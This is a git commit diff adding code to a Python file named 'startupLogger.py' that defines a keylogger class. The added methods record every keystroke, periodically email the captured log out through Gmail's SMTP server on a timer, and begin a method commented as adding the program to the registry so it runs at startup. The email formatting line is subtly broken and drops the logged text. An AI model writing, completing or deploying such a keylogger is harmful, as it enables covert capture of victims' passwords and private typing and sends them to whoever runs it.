4085674dd511694df4071a8456c7b3d93d44c49a
eduardoMag <eduardobautista13@gmail.com>
2020-02-20 14:55:29 -0600

    Work update on file

--- startupLogger.py
+++ startupLogger.py
@@ -10,3 +10,37 @@ class Keylogger:
         self.logger = "[Keylogger Initiated]"
         self.subject = "Keylogger Report Email"
         self.email = "email"
+        self.password = "password"
+        self.interval = time_interval
+
+    def append_to_log(self, key_strike):
+        self.logger = self.logger + key_strike
+
+    def evaluate_keys(self, key):
+        try:
+            Pressed_key = str(key.char)
+        except AttributeError:
+           if key == key.space:
+                Pressed_key = " "
+           else:
+                Pressed_key = " " + str(key) + " "
+
+        self.append_to_log(Pressed_key)
+
+    def report(self):
+        #send the email of what has been logged
+        self.send_email(self.email, self.password, self.subject, self.logger)
+        self.logger = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def send_email(self, email, password, subject, message):
+        Email_message = 'Subject: {}\n\n'.format(subject, message)
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, Email_message)
+        server.quit()
+
+    def add_registry(self):
+        #program to registry so that it runs on startup
